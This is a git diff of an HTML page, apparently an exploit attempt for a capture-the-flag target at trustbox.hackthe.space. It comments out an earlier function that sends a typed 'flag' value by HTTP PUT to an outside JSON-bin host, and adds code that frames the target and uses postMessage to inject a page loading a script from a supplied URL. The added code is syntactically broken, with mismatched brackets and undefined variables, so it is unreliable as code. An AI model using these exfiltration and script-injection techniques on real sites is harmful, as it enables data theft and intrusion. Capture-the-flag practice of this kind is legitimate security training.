@@ -3,10 +3,34 @@
 		<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline';">
 	</head>
 	<body>
-		<script id="pwn" src="true">
-		</script>
 		<script>
-			function sendmydata(data) {
+			var script = `
+				window.onload = function() {
+					alert("here");
+				}
+			`;
+			
+			window.onload = function() {
+				var frame = window.frames[0];
+				var scriptBlob = new Blob([typedArray], {type: 'application/octet-binary'});
+				
+				window.addEventListener("message", function(e) {
+					if (first) {
+						var scriptUrl = e.data.url;
+						var page = "<html><head><script src='" + scriptUrl + "'><\/script><\/head><body><\/body><\/html>";
+
+						first = false;
+						frame.postMessage({action: "add", file: page), '*');
+					} else {
+						window.open(e.data.url);
+					}
+				}
+				, false);
+				
+				frame.postMessage({action: "add", file: scriptBlob), '*');
+			}
+			
+			/*function sendmydata(data) {
 				var req = new XMLHttpRequest();
 	
 				req.open("PUT", "https://json.extendsclass.com/bin/efbe379dfbef");
@@ -26,12 +50,15 @@
 					sendmydata("" + element.value);
 					e.preventDefault();
 				}
-			}
+			}*/
 		</script>
 		
-		<form id="myform">
+		<iframe src="https://trustbox.hackthe.space/store">
+		</iframe>
+		
+		<!--<form id="myform">
 			<input id="flag" name="name" type="text" />
 			<input type="submit" />
-		</form>
+		</form>-->
 	</body>
 </html>
